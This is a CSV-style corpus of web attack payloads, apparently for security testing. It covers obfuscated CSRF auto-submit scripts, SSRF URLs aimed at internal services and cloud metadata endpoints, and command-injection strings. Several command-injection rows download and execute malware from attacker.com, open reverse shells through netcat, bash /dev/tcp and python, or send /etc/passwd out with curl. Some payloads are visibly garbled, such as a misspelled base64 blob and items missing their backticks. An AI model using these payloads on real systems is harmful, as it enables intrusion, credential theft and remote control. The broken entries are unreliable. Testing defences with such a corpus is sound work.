csrf-087,csrf,<script>var p=decodeURIComponent('%66%6f%72%6d');var f=document.createElement(p);f.action='https://target.com/api/update';f.method='POST';var i=document.createElement('input');i.name='data';i.value='evil';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,CSRF,high,Encoded element creation,CSRF with encoded URI components and dynamic decoding,
csrf-088,csrf,"<iframe id='f' style='display:none'></iframe><script>var i=document.getElementById('f');i.src='about:blank';i.onload=function(){var d=i.contentDocument||i.contentWindow.document;d.open();d.write('<form action=""https://target.com/api/steal"" method=""POST"" id=""form""><input name=""data"" value=""evil""/></form>');d.close();d.getElementById('form').submit();};</script>",CSRF,critical,Stealth iframe with postMessage,CSRF with stealth iframe and form submission via postMessage,
csrf-089,csrf,<script>var s='ht'+'tp'+'s:'+'//ta'+'rget.com/api/evil';var f=document.createElement('form');f.action=s;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,CSRF,high,String split and join obfuscation,CSRF with obfuscated script using string split and join,
csrf-090,csrf,"<div id='container'></div><script>document.getElementById('container').innerHTML='<form action=""https://target.com/api/hack"" method=""POST"" id=""f""><input name=""data"" value=""evil""/></form><script>document.getElementById(\'f\').submit();</script>';</script>",CSRF,critical,Script injection via innerHTML,CSRF with script tag injection via innerHTML,
csrf-091,csrf,<script>eval(atob('dmFyIGY9ZG9jdW1lbnQuYWxlbWVudC5jcmVhdGVFbGVtZW50KCdmb3JtJyk7IGYuYWN0aW9uID0naHR0cHM6Ly90YXJnZXQuY29tL2FwaS9leGl0JztmLm1ldGhvZCA9J1BPU1QnOyB2YXIgaSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lucHV0Jyk7IGku bmFtZSA9J2RhdGEnOyBpLnZhbHVlID0nZXZpbCc7IGYucGFzc0NoaWxkKGlpKTsgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChmKTsgZi5zdWJtaXQoKTs='));</script>,CSRF,critical,Base64 encoded eval obfuscation,CSRF with obfuscated base64 and eval,
csrf-092,csrf,"<svg xmlns='http://www.w3.org/2000/svg'><script><![CDATA[fetch('https://target.com/api/evil',{method:'POST',body:'data=evil'})]]></script></svg>",CSRF,high,SVG embedded script,CSRF with SVG image and embedded script,
csrf-093,csrf,<meta http-equiv='refresh' content='0;url=https%3A%2F%2Ftarget.com%2Fapi%2Fupdate%3Fdata%3Devil'/>,CSRF,medium,Meta refresh with URL encoding,CSRF with meta refresh and URL encoded payload,
csrf-094,csrf,"<a href=""javascript:(function(){var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();})()"">Click me</a>",CSRF,high,JavaScript URL with obfuscation,CSRF with JavaScript URL and obfuscated payload,
csrf-095,csrf,"<img src='invalid.jpg' onerror=""var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='data';i.value='evil';f.appendChild(i);document.body.appendChild(f);f.submit();"" style='display:none'/>",CSRF,high,Image onerror event trigger,CSRF with hidden image and onerror event,
csrf-096,csrf,<script>var a=\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074;var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,CSRF,high,Unicode escape obfuscation,CSRF with obfuscated Unicode escapes,
csrf-097,csrf,"<div style=""width:expression((function(){var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();})())""></div>",CSRF,high,CSS expression injection,CSRF with CSS expression to trigger script,
csrf-098,csrf,"<script>var xhr=new XMLHttpRequest();var u='https://target.com/api/evil';xhr.open('POST',u,true);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('data=evil');</script>",CSRF,critical,XHR POST request,CSRF with XMLHttpRequest and obfuscated URL,
csrf-099,csrf,<style>@keyframes x{from{opacity:0}to{opacity:1}}</style><form action='https://target.com/api/evil' method='POST' id='f' style='animation:x 1s forwards' onanimationend='this.submit()'><input name='data' value='evil'/></form>,CSRF,medium,CSS animation event trigger,CSRF with form submission triggered by CSS animation,
csrf-100,csrf,"<script>var s=['ht','tp','s:','//','target','.com','/api','/evil'].join('');var f=document.createElement('form');f.action=s;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>",CSRF,high,Array join obfuscation,CSRF with obfuscated script using array join,
ssrf-001,ssrf,http://127.0.0.1/,SSRF,high,Access internal localhost service,Basic SSRF to internal IP,
ssrf-002,ssrf,http://192.168.1.1/,SSRF,high,Access internal network device,SSRF to internal private IP range,
ssrf-003,ssrf,http://169.254.169.254/latest/meta-data/,SSRF,critical,AWS EC2 instance metadata,SSRF to metadata service on AWS,
ssrf-004,ssrf,http://metadata.google.internal/computeMetadata/v1/,SSRF,critical,Google Cloud metadata,SSRF to GCP metadata service,
ssrf-005,ssrf,http://169.254.169.254/metadata/instance?api-version=2021-02-01,SSRF,critical,Azure VM metadata,SSRF to Azure instance metadata,
ssrf-006,ssrf,redis://127.0.0.1:6379,SSRF,high,Access internal Redis,SSRF to internal Redis service,
ssrf-007,ssrf,memcached://127.0.0.1:11211,SSRF,high,Access internal Memcached,SSRF to internal Memcached service,
ssrf-008,ssrf,ftp://127.0.0.1/,SSRF,medium,Access internal FTP,SSRF to internal FTP server,
ssrf-009,ssrf,smb://192.168.1.100/share,SSRF,high,Access internal SMB share,SSRF to internal SMB share,
ssrf-010,ssrf,http://127.0.0.1:2375/containers/json,SSRF,critical,Access Docker API,SSRF to internal Docker API,
ssrf-011,ssrf,https://kubernetes.default.svc/api,SSRF,critical,Access Kubernetes API,SSRF to internal Kubernetes API,
ssrf-012,ssrf,http://127.0.0.1:8080/api/json,SSRF,high,Access Jenkins API,SSRF to internal Jenkins API,
ssrf-013,ssrf,http://127.0.0.1:9200/_cat/indices?v,SSRF,high,Access Elasticsearch,SSRF to internal Elasticsearch cluster,
ssrf-014,ssrf,http://127.0.0.1:15672/api/overview,SSRF,high,Access RabbitMQ API,SSRF to internal RabbitMQ management API,
ssrf-015,ssrf,mysql://127.0.0.1:3306,SSRF,high,Access MySQL service,SSRF to internal MySQL service,
ssrf-016,ssrf,postgresql://127.0.0.1:5432,SSRF,high,Access PostgreSQL service,SSRF to internal PostgreSQL service,
ssrf-017,ssrf,smtp://127.0.0.1:25,SSRF,medium,Access SMTP server,SSRF to internal SMTP server,
ssrf-018,ssrf,snmp://127.0.0.1,SSRF,medium,Access SNMP service,SSRF to internal SNMP service,
ssrf-019,ssrf,ldap://127.0.0.1:389,SSRF,high,Access LDAP service,SSRF to internal LDAP service,
ssrf-020,ssrf,http://127.0.0.1/../../../../etc/passwd,SSRF,critical,Attempt path traversal via SSRF,SSRF to internal HTTP service with path traversal,
ssrf-021,ssrf,http://%31%39%32.%31%36%38.%31.%31/,SSRF,high,URL encoded internal IP,SSRF with URL encoded internal IP,
ssrf-022,ssrf,http://0300.0250.0001.0001/,SSRF,high,Octal encoded IP address,SSRF with octal encoded IP,
ssrf-023,ssrf,http://3232235777/,SSRF,high,Decimal encoded IP address,SSRF with decimal encoded IP,
ssrf-024,ssrf,http://[::1]/,SSRF,high,IPv6 localhost,SSRF with IPv6 loopback,
ssrf-025,ssrf,file:///etc/passwd,SSRF,critical,Local file read attempt,SSRF with file protocol to read local file,
ssrf-026,ssrf,gopher://127.0.0.1:6379/_SET%20key%201%0D%0A,SSRF,critical,Gopher protocol to Redis,SSRF with gopher protocol to send raw TCP,
ssrf-027,ssrf,"data:text/html;base64,PHNjcmlwdD5hbGVydCgnU1NSRiBFeHBlcmltZW50Jyk8L3NjcmlwdD4=",SSRF,medium,Data URI with embedded script,SSRF with data URI scheme,
ssrf-028,ssrf,javascript:alert('SSRF'),SSRF,low,JavaScript URI scheme,SSRF with javascript URI scheme,
ssrf-029,ssrf,file:///proc/self/environ,SSRF,critical,Access process environment,SSRF with file descriptor access,
ssrf-030,ssrf,http://%31%32%37.%30.%30.%31%2F%2E%2E%2F%2E%2E%2Fetc/passwd,SSRF,critical,Nested URL encoded path traversal,SSRF with nested URL encoding,
ssrf-031,ssrf,ftp://127.0.0.1/../../../../etc/passwd,SSRF,critical,FTP directory traversal,SSRF with FTP protocol and directory traversal,
ssrf-032,ssrf,smb://127.0.0.1/../../../../Windows/System32/drivers/etc/hosts,SSRF,critical,SMB UNC path traversal,SSRF with SMB protocol and UNC path,
ssrf-033,ssrf,http://127.0.0.1:80/%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a,SSRF,critical,HTTP request smuggling,SSRF with HTTP request smuggling attempt,
ssrf-034,ssrf,"http://127.0.0.1:80/
X-Injected-Header: evil",SSRF,critical,HTTP header injection,SSRF with HTTP header injection,
ssrf-035,ssrf,http://admin:password@127.0.0.1/admin,SSRF,high,Basic auth credentials,SSRF with HTTP basic auth to internal service,
ssrf-036,ssrf,http://external.com/redirect?url=http://127.0.0.1/,SSRF,high,Redirect to internal IP,SSRF with HTTP redirect to internal IP,
ssrf-037,ssrf,http://evil.com/,SSRF,critical,DNS rebinding to internal IP,SSRF with DNS rebinding attack,
ssrf-038,ssrf,http://[::ffff:127.0.0.1]/,SSRF,high,IPv4 mapped IPv6,SSRF with IPv4 mapped IPv6 address,
ssrf-039,ssrf,http://127.0.0.1/%0a%0d,SSRF,medium,Encoded newline injection,SSRF with encoded newline characters,
ssrf-040,ssrf,http://127.0.0.1/?_method=POST,SSRF,medium,Method override parameter,SSRF with HTTP POST method override,
ssrf-041,ssrf,http://127.0.0.1/chunked,SSRF,medium,Chunked transfer encoding test,SSRF with HTTP chunked transfer encoding,
ssrf-042,ssrf,http://127.0.0.1/trace,SSRF,medium,HTTP TRACE method test,SSRF with HTTP TRACE method,
ssrf-043,ssrf,http://127.0.0.1/options,SSRF,medium,HTTP OPTIONS method test,SSRF with HTTP OPTIONS method,
ssrf-044,ssrf,http://127.0.0.1/connect,SSRF,medium,HTTP CONNECT method test,SSRF with HTTP CONNECT method,
ssrf-045,ssrf,http://127.0.0.1/patch,SSRF,medium,HTTP PATCH method test,SSRF with HTTP PATCH method,
ssrf-046,ssrf,http://127.0.0.1/delete,SSRF,medium,HTTP DELETE method test,SSRF with HTTP DELETE method,
ssrf-047,ssrf,http://127.0.0.1/put,SSRF,medium,HTTP PUT method test,SSRF with HTTP PUT method,
ssrf-049,ssrf,"http://127.0.0.1/
X-Forwarded-For: 127.0.0.1",SSRF,high,Inject X-Forwarded-For header,SSRF with HTTP header injection via URL,
ssrf-050,ssrf,http://127.0.0.1@evil.com/,SSRF,high,Userinfo section in URL,SSRF with HTTP userinfo section to bypass filters,
ssrf-051,ssrf,dict://127.0.0.1/,SSRF,medium,Access internal dictionary service,SSRF with dict protocol to query dictionary service,
ssrf-052,ssrf,telnet://127.0.0.1:23,SSRF,medium,Access internal telnet service,SSRF with telnet protocol,
ssrf-053,ssrf,"ldap://127.0.0.1:389/ou=users,dc=example,dc=com?uid",SSRF,high,LDAP query,SSRF with ldap protocol to query LDAP server,
ssrf-054,ssrf,rdp://127.0.0.1:3389,SSRF,medium,Access internal RDP service,SSRF with rdp protocol,
ssrf-055,ssrf,smb://127.0.0.1/share,SSRF,high,Access SMB share,SSRF with smb protocol to access Windows share,
ssrf-056,ssrf,nfs://127.0.0.1/export,SSRF,medium,Access NFS export,SSRF with nfs protocol,
ssrf-057,ssrf,imap://127.0.0.1:143,SSRF,medium,Access IMAP mail server,SSRF with imap protocol,
ssrf-058,ssrf,pop3://127.0.0.1:110,SSRF,medium,Access POP3 mail server,SSRF with pop3 protocol,
ssrf-059,ssrf,mqtt://127.0.0.1:1883,SSRF,medium,Access MQTT broker,SSRF with mqtt protocol,
ssrf-060,ssrf,ws://127.0.0.1:8080/,SSRF,medium,Access WebSocket service,SSRF with ws protocol (WebSocket),
ssrf-061,ssrf,wss://127.0.0.1:8443/,SSRF,medium,Access secure WebSocket service,SSRF with wss protocol (Secure WebSocket),
ssrf-062,ssrf,bitcoin://127.0.0.1/,SSRF,low,Bitcoin protocol scheme,SSRF with bitcoin protocol,
ssrf-063,ssrf,magnet:?xt=urn:btih:abcdef1234567890,SSRF,low,Magnet link protocol,SSRF with magnet protocol,
ssrf-064,ssrf,ssh://127.0.0.1:22,SSRF,medium,Access SSH service,SSRF with ssh protocol,
ssrf-065,ssrf,tel:+1234567890,SSRF,low,Telephone protocol,SSRF with tel protocol,
ssrf-066,ssrf,sms:+1234567890,SSRF,low,SMS protocol,SSRF with sms protocol,
ssrf-067,ssrf,"geo:37.786971,-122.399677",SSRF,low,Geolocation protocol,SSRF with geo protocol,
ssrf-068,ssrf,svn://127.0.0.1/repo,SSRF,medium,Subversion protocol,SSRF with svn protocol,
ssrf-069,ssrf,git://127.0.0.1/repo.git,SSRF,medium,Git protocol,SSRF with git protocol,
ssrf-070,ssrf,sftp://127.0.0.1/home/user/,SSRF,medium,Secure FTP protocol,SSRF with sftp protocol,
ssrf-071,ssrf,http://%2531%25327%2532%253E%253E%253E/,SSRF,high,Double URL encoded IP,SSRF with double URL encoding,
ssrf-072,ssrf,HtTp://127.0.0.1/,SSRF,medium,Mixed case HTTP scheme,SSRF with mixed case scheme to bypass filters,
ssrf-073,ssrf,http://127.0.0.1%00.example.com/,SSRF,high,Null byte injection,SSRF with embedded null byte to bypass filters,
ssrf-074,ssrf,"http://127.0.0.1/
Set-Cookie:evil=1",SSRF,critical,CRLF injection,SSRF with CRLF injection in URL,
ssrf-076,ssrf,http://[::ffff:192.168.1.1]:8080/,SSRF,high,IPv6 embedded IPv4 with port,SSRF with IPv6 embedded IPv4 and port,
ssrf-078,ssrf,http://127.0.0.1/%0d%0aX-Injected-Header:evil,SSRF,critical,HTTP header injection,SSRF with HTTP header injection via URL encoding,
ssrf-080,ssrf,file:///etc/passwd%00,SSRF,critical,File read with null byte,SSRF with file protocol and directory traversal,
ssrf-081,ssrf,http://admin%3Apassword@127.0.0.1/,SSRF,high,Basic auth with encoding,SSRF with HTTP basic auth and URL encoding,
ssrf-091,ssrf,http://0x7f.0x0.0x0.0x1/,SSRF,high,Hexadecimal IPv4 address,SSRF with IPv4 in hexadecimal,
ssrf-092,ssrf,http://127.1/,SSRF,high,Shortened IPv4 address,SSRF with IPv4 in mixed notation,
ssrf-093,ssrf,http://2130706433/,SSRF,high,Integer IPv4 address,SSRF with IPv4 in integer format,
ssrf-095,ssrf,http://127.0.0.1/#fragment,SSRF,low,URL fragment,SSRF with HTTP URL fragment,
ssrf-096,ssrf,http://127.0.0.1/?param=value,SSRF,low,Query parameter,SSRF with HTTP URL query parameter injection,
ssrf-098,ssrf,http://127.0.0.1/%2e%2e/%2e%2e%2e/%2e%2e/%2e%2e/etc/passwd,SSRF,critical,URL encoded path traversal,SSRF with HTTP URL encoded path traversal,
ssrf-099,ssrf,http://127.0.0.1/%2f%2f/etc/passwd,SSRF,critical,Encoded double slash,SSRF with HTTP URL encoded double slash,
ssrf-100,ssrf,http://%31%32%37.%30.%30.%31/%2E%2E/%2e%2e/%2E%2e/etc/passwd,SSRF,critical,Mixed encoding and case path traversal,SSRF with HTTP URL with mixed encoding and case,
cmdinj-001,cmdi,; ls -la,Command Injection,high,Inject list directory command,Basic command injection with semicolon,
cmdinj-002,cmdi,&& cat /etc/passwd,Command Injection,critical,Inject read passwd file,Command injection with && operator,
cmdinj-003,cmdi,| whoami,Command Injection,high,Inject whoami command,Command injection with pipe operator,
cmdinj-004,cmdi,id,Command Injection,high,Inject id command using backticks,Command injection with backticks,
cmdinj-005,cmdi,$(uname -a),Command Injection,high,Inject uname command,Command injection with $() syntax,
cmdinj-006,cmdi,$(echo $(whoami)),Command Injection,high,Nested command substitution,Command injection with nested $(),
cmdinj-007,cmdi,& sleep 10,Command Injection,medium,Inject sleep command for timing attack,Command injection with ampersand and sleep,
cmdinj-008,cmdi,"&& echo 'injected'
",Command Injection,high,Inject command with newline,Command injection with newline character,
cmdinj-009,cmdi,; curl http://attacker.com,Command Injection,critical,Exfiltrate data via curl,Command injection with semicolon and curl,
cmdinj-010,cmdi,; wget http://attacker.com/malware.sh -O /tmp/m.sh; sh /tmp/m.sh,Command Injection,critical,Download and execute malware,Command injection with semicolon and wget,
cmdinj-011,cmdi,| nc attacker.com 4444 -e /bin/sh,Command Injection,critical,Reverse shell via netcat,Command injection with pipe and netcat reverse shell,
cmdinj-012,cmdi,whoami,Command Injection,high,Execute whoami command,Command injection with backticks and whoami,
cmdinj-013,cmdi,$(id),Command Injection,high,Execute id command,Command injection with $() and id,
cmdinj-014,cmdi,; echo injected,Command Injection,medium,Simple echo injection,Command injection with semicolon and echo,
cmdinj-015,cmdi,&& cat /etc/shadow,Command Injection,critical,Read shadow file,Command injection with && and cat /etc/shadow,
cmdinj-016,cmdi,; id,Command Injection,high,Execute id command,Command injection with semicolon and id,
cmdinj-017,cmdi,| env,Command Injection,medium,Print environment variables,Command injection with pipe and env,
cmdinj-018,cmdi,ls /,Command Injection,high,List root directory,Command injection with backticks and ls,
cmdinj-019,cmdi,$(ps aux),Command Injection,medium,List running processes,Command injection with $() and ps,
cmdinj-020,cmdi,; whoami,Command Injection,high,Execute whoami command,Command injection with semicolon and whoami,
cmdinj-021,cmdi,%3B%20id,Command Injection,high,URL encoded semicolon and id command,Command injection with URL encoding,
cmdinj-022,cmdi,`echo \whoami\`,Command Injection,high,Nested backticks execution,Command injection with nested backticks,
cmdinj-023,cmdi,; echo $USER,Command Injection,medium,Print current user environment variable,Command injection with environment variable,
cmdinj-024,cmdi,; echo\x20injected,Command Injection,medium,Hex encoded space character,Command injection with hex encoded characters,
cmdinj-025,cmdi,; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2Ng== | base64 -d | bash,Command Injection,critical,Base64 encoded reverse shell,Command injection with base64 encoded command,
cmdinj-026,cmdi,$(sleep 10),Command Injection,medium,Timing attack with sleep,Command injection with command substitution and sleep,
cmdinj-027,cmdi,; echo $(whoami),Command Injection,high,Nested command substitution,Command injection with semicolon and nested $(),
cmdinj-028,cmdi,; echo injected\; ls,Command Injection,medium,Escape semicolon,Command injection with backslash escaping,
cmdinj-029,cmdi,; ls -la && whoami || echo failed,Command Injection,high,Multiple command chaining,Command injection with multiple command separators,
cmdinj-030,cmdi,; (id; uname -a),Command Injection,high,Grouped commands,Command injection with command grouping,
cmdinj-031,cmdi,; (sleep 5),Command Injection,medium,Subshell with sleep,Command injection with subshell,
cmdinj-032,cmdi,; ls -la #,Command Injection,medium,Command injection with comment,Command injection with command chaining and comments,
cmdinj-033,cmdi,echo $(whoami),Command Injection,high,Nested command execution,Command injection with backticks and nested $(),
cmdinj-034,cmdi,; echo $PATH,Command Injection,medium,Print PATH environment variable,Command injection with semicolon and environment variable expansion,
cmdinj-035,cmdi,$(echo injected),Command Injection,medium,Echo injected string,Command injection with command substitution and echo,
cmdinj-036,cmdi,; (echo injected; whoami),Command Injection,high,Multiple commands in subshell,Command injection with semicolon and nested subshell,
cmdinj-037,cmdi,; sleep 15,Command Injection,medium,Timing attack,Command injection with semicolon and sleep for timing,
cmdinj-040,cmdi,; curl http://attacker.com/malware.sh -o /tmp/m.sh; sh /tmp/m.sh,Command Injection,critical,Download and execute script,Command injection with semicolon and curl download,
cmdinj-042,cmdi,; export MALICIOUS=1,Command Injection,medium,Set environment variable,Command injection with semicolon and environment variable manipulation,
cmdinj-043,cmdi,; echo 'malicious' > /tmp/malicious.txt,Command Injection,medium,Write to file,Command injection with semicolon and echo to file,
cmdinj-044,cmdi,; chmod +x /tmp/m.sh,Command Injection,medium,Change file permissions,Command injection with semicolon and chmod,
cmdinj-045,cmdi,; cat /etc/shadow,Command Injection,critical,Read shadow file,Command injection with semicolon and cat /etc/shadow,
cmdinj-046,cmdi,; echo 'injected; ls -la',Command Injection,medium,Echo with special characters,Command injection with semicolon and echo with special characters,
cmdinj-047,cmdi,"; echo ""$(whoami)""",Command Injection,high,Nested command with quotes,Command injection with semicolon and nested command with quotes,
cmdinj-048,cmdi,"; awk 'BEGIN {system(""id"")}'",Command Injection,high,Execute command via awk,Command injection with semicolon and awk command,
cmdinj-049,cmdi,; perl -e 'print id',Command Injection,high,Execute command via perl,Command injection with semicolon and perl command,
cmdinj-050,cmdi,"; python -c 'import os; os.system(""id"")'",Command Injection,high,Execute command via python,Command injection with semicolon and python command,
cmdinj-051,cmdi,& whoami,Command Injection,high,Execute whoami command,Windows cmd injection with & separator,
cmdinj-052,cmdi,| dir,Command Injection,high,List directory contents,Windows cmd injection with | separator,
cmdinj-053,cmdi,&& ipconfig,Command Injection,high,Display network config,Windows cmd injection with && separator,
cmdinj-054,cmdi,|| net user,Command Injection,high,List users,Windows cmd injection with || separator,
cmdinj-055,cmdi,; Get-Process,Command Injection,high,List running processes,Windows PowerShell injection with semicolon,
cmdinj-057,cmdi,$(Get-ChildItem),Command Injection,high,List directory contents,Windows PowerShell injection with $(),
cmdinj-058,cmdi,; Start-Process notepad.exe,Command Injection,medium,Launch notepad,Windows PowerShell injection with Start-Process,
cmdinj-059,cmdi,& echo injected > C:\Windows\Temp\injected.txt,Command Injection,medium,Write to file,Windows cmd injection with echo to file,
cmdinj-060,cmdi,& nc attacker.com 4444 -e cmd.exe,Command Injection,critical,Reverse shell,Windows cmd injection with netcat reverse shell,
cmdinj-062,cmdi,| id,Command Injection,high,Execute id,macOS/Linux injection with pipe and id,
cmdinj-063,cmdi,&& uname -a,Command Injection,high,System info,macOS/Linux injection with && and uname,
cmdinj-069,cmdi,; powershell -EncodedCommand SQBFAFgAUABMAGEAYwBlAC4AZQB4AGU=,Command Injection,high,Encoded PowerShell command,Windows PowerShell injection with encoded command,
cmdinj-070,cmdi,"& for /L %i in (1,1,5) do @echo %i",Command Injection,medium,Loop command,Windows cmd injection with for loop,
cmdinj-071,cmdi,; Invoke-Expression 'whoami',Command Injection,high,Execute command,Windows PowerShell injection with Invoke-Expression,
cmdinj-072,cmdi,; env,Command Injection,medium,Print environment variables,macOS/Linux injection with semicolon and env,
cmdinj-073,cmdi,; cat /etc/passwd,Command Injection,critical,Read passwd file,macOS/Linux injection with semicolon and cat /etc/passwd,
cmdinj-074,cmdi,& reg query HKLM\Software,Command Injection,medium,Query registry,Windows cmd injection with reg query,
cmdinj-075,cmdi,; Get-Content C:\Windows\System32\drivers\etc\hosts,Command Injection,high,Read hosts file,Windows PowerShell injection with Get-Content,
cmdinj-076,cmdi,; dmesg,Command Injection,medium,Kernel messages,macOS/Linux injection with semicolon and dmesg,
cmdinj-077,cmdi,; netstat -an,Command Injection,medium,Network connections,macOS/Linux injection with semicolon and netstat,
cmdinj-078,cmdi,& tasklist,Command Injection,medium,List running tasks,Windows cmd injection with tasklist,
cmdinj-079,cmdi,; Get-Service,Command Injection,medium,List services,Windows PowerShell injection with Get-Service,
cmdinj-080,cmdi,; ps aux,Command Injection,medium,List processes,macOS/Linux injection with semicolon and ps aux,
cmdinj-081,cmdi,& echo injected | findstr injected,Command Injection,medium,Echo and filter output,Windows cmd injection with echo and pipe,
cmdinj-082,cmdi,; Start-Process notepad.exe -WindowStyle Hidden,Command Injection,medium,Launch process hidden,Windows PowerShell injection with Start-Process and hidden window,
cmdinj-083,cmdi,; curl http://attacker.com/?data=$(cat /etc/passwd),Command Injection,critical,Exfiltrate data via curl,macOS/Linux injection with semicolon and curl to exfiltrate data,
cmdinj-084,cmdi,& powershell -EncodedCommand JABXAGUAYgA9ACJIZWxsbyBXb3JsZCIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA,Command Injection,high,Encoded PowerShell payload,Windows cmd injection with powershell encoded command,
cmdinj-085,cmdi,; nc attacker.com 4444 -e /bin/bash,Command Injection,critical,Reverse shell via netcat,macOS/Linux injection with semicolon and nc reverse shell,
cmdinj-086,cmdi,& certutil -urlcache -split -f http://attacker.com/malware.exe malware.exe & malware.exe,Command Injection,critical,Download and execute file,Windows cmd injection with certutil download,
cmdinj-087,cmdi,; bash -i >& /dev/tcp/attacker.com/4444 0>&1,Command Injection,critical,Reverse shell via bash,macOS/Linux injection with semicolon and bash reverse shell,
cmdinj-088,cmdi,; Invoke-WebRequest -Uri http://attacker.com/malware.ps1 -OutFile C:\Windows\Temp\m.ps1; powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\m.ps1,Command Injection,critical,Download and execute PowerShell script,Windows PowerShell injection with Invoke-WebRequest,
cmdinj-089,cmdi,"; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",Command Injection,critical,Reverse shell via python,macOS/Linux injection with semicolon and python reverse shell,
cmdinj-090,cmdi,& powershell -EncodedCommand SQBFAFgAUABMAGUAYQBjAGgAIABbAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQ==,Command Injection,critical,Encoded PowerShell reverse shell,Windows cmd injection with powershell encoded reverse shell,
cmdinj-091,cmdi,; e${IFS}cho injected,Command Injection,high,Bypass simple filters using ${IFS} (space) variable,Obfuscated command injection using environment variable concatenation,
cmdinj-093,cmdi,%253B%2520id,Command Injection,high,Double URL encoded semicolon and id,Command injection with double URL encoding,
cmdinj-094,cmdi,; VAR=whoami; $VAR,Command Injection,high,Use variable to execute command,Command injection using variable substitution and command chaining,
cmdinj-095,cmdi,; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash,Command Injection,critical,Decode and execute base64 payload,Command injection using nested base64 decoding and execution,
cmdinj-096,cmdi,"&& echo injected
id",Command Injection,high,Use newline as command separator,Command injection using less common command separator (newline),
cmdinj-097,cmdi,; powershell -EncodedCommand JABXAGUAYgA9ACJXaG8gSSBhbSIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA,Command Injection,critical,Obfuscated PowerShell encoded command,Command injection using PowerShell encoded command with obfuscation,
cmdinj-098,cmdi,"; echo $(echo ""$(whoami)"")",Command Injection,high,Nested command substitution with quotes,Command injection using command substitution with nested quotes,
cmdinj-099,cmdi,; export CMD=whoami; ${CMD},Command Injection,high,Indirect command execution via env var,Command injection using environment variable and indirect expansion,
